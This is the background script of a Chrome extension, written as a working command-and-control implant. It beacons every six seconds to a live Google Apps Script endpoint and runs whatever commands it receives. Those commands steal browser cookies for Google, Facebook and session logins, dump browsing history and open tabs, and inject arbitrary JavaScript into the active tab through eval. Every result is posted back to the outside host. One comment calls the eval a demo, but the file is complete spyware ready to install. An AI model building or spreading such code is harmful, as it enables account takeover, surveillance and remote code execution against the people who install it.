const C2_URL = "https://script.google.com/macros/s/AKfycbwkwM9eh_JVxFMgkw-RXaIsU99Zk3XDW3fz4dTsmPAmmkbOn4VvIRwhgE4AVrs7Jrz4/exec";
const BEACON_INTERVAL_MINUTES = 0.1; // 0.1 minuti = 6 secondi

// Alarms for manifest v3
chrome.runtime.onInstalled.addListener(() => {
    console.log("[+] Extension Installed. Creating Alarm.");
    createAlarm();
});
chrome.runtime.onStartup.addListener(() => {
    console.log("[+] Browser Started. Re-creating Alarm.");
    createAlarm();
});
function createAlarm() {
    chrome.alarms.create("c2_beacon", {
        periodInMinutes: BEACON_INTERVAL_MINUTES
    });
}
chrome.alarms.onAlarm.addListener((alarm) => {
    if (alarm.name === "c2_beacon") {
        beacon();
    }
});

// ### BEACONING LOOP ###
async function beacon() {
    try {
        let response = await fetch(C2_URL);
        let rawCommand = await response.text();
        if (rawCommand && rawCommand !== "WAITING" && rawCommand.trim() !== "") {
            console.log(`[+] Command received: ${rawCommand}`);
            await processCommand(rawCommand);
        } else {
            console.log("[-] Beacon sent. Nothing to do.");
        }
    } catch (e) {
        console.error("[-] C2 Connection Error:", e);
    }
}

// ### COMMAND PROCESSOR ###
async function processCommand(rawCmd) {
    let output = "Command executed, no output.";
    let cmd = rawCmd.split(" ")[0];

    try {
        switch (cmd) {
            case "WHOAMI":
                output = `User-Agent: ${navigator.userAgent}\nPlatform: ${navigator.platform}\nLanguage: ${navigator.language}`;
                break;

            case "STEAL_COOKIES":
                let cookies = await chrome.cookies.getAll({});
                if (cookies.length > 0) {
                    let targets = cookies.filter(c => c.domain.includes("google") || c.domain.includes("uni") || c.domain.includes("facebook") || c.session); // Filter critical domains and limit to avoid overflow
                    let data = targets.slice(0, 15).map(c => `${c.domain}::${c.name}=${c.value}`).join(" || ");
                    output = data || "Cookies found but none matched target filters.";
                } else {
                    output = "No cookies found in browser storage.";
                }
                break;

            case "GET_HISTORY":
                let historyItems = await chrome.history.search({text: '', maxResults: 20});
                output = historyItems.map(h => `[${new Date(h.lastVisitTime).toLocaleTimeString()}] ${h.url}`).join("\n");
                break;

            case "GET_TABS":
                let tabs = await chrome.tabs.query({});
                output = tabs.map(t => `ID: ${t.id} | TITLE: ${t.title} | URL: ${t.url}`).join("\n");
                break;

            case "EXECUTE_JS":
                // Syntax: EXECUTE_JS alert('Hacked')
                let code = rawCmd.substring(11); 
                if (!code) { output = "Error: No code provided."; break; }
                
                let activeTabs = await chrome.tabs.query({active: true, currentWindow: true});
                if (activeTabs.length > 0) {
                    await chrome.scripting.executeScript({
                        target: {tabId: activeTabs[0].id},
                        func: (injectedCode) => { 
                            // Dangerous implementation for demo purposes
                            try { window.eval(injectedCode); } catch(e) { console.error(e); }
                        }, 
                        args: [code]
                    });
                    output = `Javascript payload injected into tab: ${activeTabs[0].title}`;
                } else {
                    output = "Error: No active tab found.";
                }
                break;

            default:
                output = `Error: Unknown command '${cmd}'`;
        }
    } catch (err) {
        output = `[-] Execution Error: ${err.message}`;
    }

    await exfiltrateData(output);
}

async function exfiltrateData(data) {
    try {
        await fetch(C2_URL, {
            method: "POST",
            body: JSON.stringify({ result: data })
        });
        console.log("[+] Data exfiltrated successfully.");
    } catch (e) {
        console.error("[-] Exfiltration failed:", e);
    }
}